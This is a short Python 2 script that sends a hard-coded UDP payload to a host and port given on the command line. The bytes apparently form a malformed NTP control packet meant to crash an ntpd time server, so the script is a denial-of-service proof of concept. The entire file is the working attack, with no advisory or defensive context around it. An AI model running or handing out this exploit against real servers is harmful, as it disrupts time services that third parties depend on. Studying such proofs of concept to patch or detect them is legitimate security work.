# -*- coding: utf-8 -*-
# @Author: lock
# @Date:   2016-11-28 22:26:42
# @Last Modified by:   lock
# @Last Modified time: 2016-11-28 22:26:47
import sys
import socket
 
if len(sys.argv) != 3:
    print "usage: " + sys.argv[0] + " <host> <port>"
    sys.exit(-1)
 
 
payload = "\x16\x0a\x00\x10\x00\x00\x00\x00\x00\x00\x00\x36\x6e\x6f\x6e\x63\x65\x2c\x20\x6c\x61\x64\x64\x72\x3d\x5b\x5d\x3a\x48\x72\x61\x67\x73\x3d\x33\x32\x2c\x20\x6c\x61\x64\x64\x72\x3d\x5b\x5d\x3a\x57\x4f\x50\x00\x32\x2c\x20\x6c\x61\x64\x64\x72\x3d\x5b\x5d\x3a\x57\x4f\x50\x00\x00"
 
print "[-] Sending payload to " + sys.argv[1] + ":" + sys.argv[2] + " ..."
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.sendto(payload, (sys.argv[1], int(sys.argv[2])))
print "[+] Done!"